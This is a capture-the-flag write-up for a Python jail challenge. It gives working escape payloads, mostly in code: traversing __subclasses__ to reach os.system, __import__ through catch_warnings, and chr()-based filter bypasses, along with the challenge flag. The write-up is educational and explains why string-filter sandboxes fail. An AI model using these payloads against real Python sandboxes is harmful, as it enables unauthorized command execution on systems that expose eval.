---
title: "Misc - Python Jail Escape"
description: "Breaking out of a restricted Python environment by leveraging built-in class hierarchies to execute system commands."
author: "Zemi"
---

## Challenge Info

| Detail     | Value        |
|------------|--------------|
| Category   | Misc         |
| Difficulty | Medium       |
| Points     | 300          |
| Flag       | `zemi{pyth0n_j41l_br34k}` |

## Challenge Files

Download the challenge files to get started:

- [flag.txt](/Website/challenges/misc-python-jail/flag.txt)
- [jail.py](/Website/challenges/misc-python-jail/jail.py)

## Reconnaissance

Connecting to the challenge:

```bash
nc challenge.ctf.local 1338
```

```
Welcome to PyJail!
You can run Python, but some things are restricted...
>>> import os
Error: 'import' is not allowed
>>> open("flag.txt")
Error: 'open' is blocked
>>> __builtins__
Error: '__builtins__' is blocked
```

So we have a Python eval jail with blocked keywords: `import`, `open`, `__builtins__`, and probably others. We need to find a way to read `flag.txt` or execute commands without using these words.

## Analysis

Python's object model gives us multiple paths to access blocked functionality. Every object in Python inherits from `object`, and through the Method Resolution Order (MRO) chain, we can traverse back up to find dangerous classes.

The key insight: even if `import` and `open` are blocked as strings, we can reach those functions through Python's class hierarchy.

## Exploitation

### Step 1: Access the class hierarchy

Start from a simple string object and walk up:

```python
>>> ''.__class__
<class 'str'>
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, ..., <class '_io.FileIO'>, ...]
```

`__subclasses__()` returns every class that inherits from `object` — including file I/O classes and subprocess classes.

### Step 2: Find a useful class

We need to find something that lets us read files or run commands. Let's search for it:

```python
>>> [x for x in ''.__class__.__mro__[1].__subclasses__() if 'warning' in str(x).lower()]
[<class 'warnings.catch_warnings'>]
```

The `catch_warnings` class gives us access to the `warnings` module, which has a reference to `__builtins__`. But let's try a more direct approach — find `os._wrap_close`:

```python
>>> [i for i,x in enumerate(''.__class__.__mro__[1].__subclasses__()) if 'wrap_close' in str(x)]
[133]
```

### Step 3: Get command execution

```python
>>> ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['system']('cat flag.txt')
zemi{pyth0n_j41l_br34k}
```

This works because:
1. `''.__class__.__mro__[1]` → `object`
2. `.__subclasses__()[133]` → `os._wrap_close`
3. `.__init__.__globals__` → the global namespace of the `os` module
4. `['system']` → `os.system`
5. `('cat flag.txt')` → execute the command

## Alternative Payloads

If the index is different, find it dynamically:

```python
>>> [x.__init__.__globals__ for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap_close' in str(x)][0]['system']('cat flag.txt')
```

Or use list comprehension to find and call in one line:

```python
>>> [x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat flag.txt')
```

If `__class__` is blocked, use `type()`:

```python
>>> type(type).__mro__
```

If single quotes are blocked, use `chr()`:

```python
>>> exec(chr(111)+chr(112)+chr(101)+chr(110))  # spells 'open'
```

## One-Liner Summary

```python
''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['system']('cat flag.txt')
```

## Tools Used

- Netcat — connect to the challenge
- Python interactive shell — test payloads locally first

## Lessons Learned

- Python sandboxes are extremely hard to make secure
- The `__subclasses__()` method exposes the entire class hierarchy
- `__init__.__globals__` leaks the global namespace of any module a class belongs to
- Real sandboxing requires OS-level isolation (containers, seccomp, etc.), not string filtering
- Always test jail payloads locally first — the subclass index may vary between Python versions
- Other useful classes to look for: `subprocess.Popen`, `os._wrap_close`, `warnings.catch_warnings`
